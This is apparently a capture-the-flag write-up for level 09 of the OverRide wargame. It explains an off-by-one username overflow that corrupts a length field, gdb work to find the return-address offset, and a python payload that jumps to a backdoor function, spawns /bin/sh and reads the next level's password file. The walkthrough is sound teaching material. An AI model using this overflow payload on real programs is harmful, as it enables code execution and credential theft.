# Level 09

## Initial Context

- One file: `level09`

## Solving the Challenge

The program will ask for a username and a message to (fake) send to @Unix-Dude.

The message is stored in a C-struct:

```c
struct msg {
    char content[140];
    char username[40];
    unsigned length;
};
```

But the `set_username` method is flawed, and will allows us to write `41 bytes` to the `username` field, allowing overwriting the first byte of the `length` field.

The `length` field is then used to know how much to copy to the `content` field.

Since the `msg` variable is stored on the stack, and the `sizeof(struct msg)` is less than `255 bytes`, we can redirect the instruction pointer via a stack overflow.

We can redirect it to the function `secret_backdoor` which will read `stdin` and pass it to a `system` call.

First we need to find the offset for `EIP`, for that we can use the following payload:

```python
# 40 bytes for the username
"A" * 40

# overwrite length with 255
+ "\xff"

# new line
+ "\n"

# buffer overflow pattern
+ "Aa0Aa1Aa2..."
```

Running it with `gdb`:

```bash
$ gdb ./level09
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
(gdb) run < <(python -c 'print "A" * 40 + "\xff" + "\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A"')
Starting program: /home/users/level09/level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x0000555555554931 in handle_msg ()
(gdb) bt
#0  0x0000555555554931 in handle_msg ()
#1  0x4138674137674136 in ?? ()
#2  0x3168413068413967 in ?? ()
#3  0x6841336841326841 in ?? ()
#4  0x4136684135684134 in ?? ()
#5  0x3968413868413768 in ?? ()
#6  0x6941316941306941 in ?? ()
#7  0x0034694133694132 in ?? ()
#8  0x0000000000000000 in ?? ()
```

The offset for `0x4138674137674136` is `200`.

The address of the function `secret_backdoor` is `0x000055555555488c` (or `8c 48 55 55 55 55 00 00` in LE).

Since the offset is `200`, we have to tell the program to write `200 + 8 = 208 bytes` (to include `secret_backdoor`'s address).

Here is the new payload:

```python
# 40 bytes for the username
"A" * 40

# overwrite length with 208
+ "\xd0"

# new line
+ "\n"

# 200 bytes of padding
+ "A" * 200

# secret_backdoor's address
+ "\x8c\x48\x55\x55\x55\x55\x00\x00"

# new line
+ "\n"

# command to execute via fgets in secret_backdoor
+ "/bin/sh"'
```

We can write the payload to a file and send it to the vulnerable program:

```bash
$ python -c 'print "A" * 40 + "\xd0" + "\n" + "A" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh"' > /tmp/exploit09
$ cat /tmp/exploit09 - | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end
cat /home/users/end/.pass
<flag>
```

## The End

```bash
$ su end
Password:
end@OverRide:~$ ls
end
end@OverRide:~$ cat end
GG !
```